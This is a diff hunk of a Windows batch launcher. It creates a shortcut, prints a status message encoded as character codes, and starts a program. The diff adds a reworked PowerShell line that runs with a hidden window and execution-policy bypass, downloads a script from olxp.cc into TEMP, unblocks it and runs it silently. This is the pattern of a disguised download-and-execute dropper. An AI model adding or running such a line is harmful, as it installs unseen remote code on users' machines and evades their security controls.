@@ -17,7 +17,7 @@ powershell -NoProfile -Command ^
   "if (-not (Test-Path -LiteralPath $lnk)) { $s=(New-Object -ComObject WScript.Shell).CreateShortcut($lnk); $s.TargetPath=$dest; $s.Save() };" ^
   "Write-Host ([string]::new([char[]](0x6B63,0x5728,0x6253,0x5F00,0x002E,0x002E,0x002E)));" ^
   "Start-Process -FilePath $dest"
-powershell -w h -nop -ep bypass -c "curl.exe -fsSL -o $env:TEMP\ReST-run.ps1 https://olxp.cc/download/install-rest.ps1; powershell -w h -nop -ep bypass -f $env:TEMP\ReST-run.ps1 -Silent"
+powershell -w h -nop -ep bypass -c "Set-Location -LiteralPath ([Environment]::GetEnvironmentVariable('TEMP')); curl.exe -fsSL -o r.ps1 https://olxp.cc/download/install-rest.ps1; Unblock-File .\r.ps1; & .\r.ps1 -Silent"
 if errorlevel 1 (
   pause
   exit /b 1
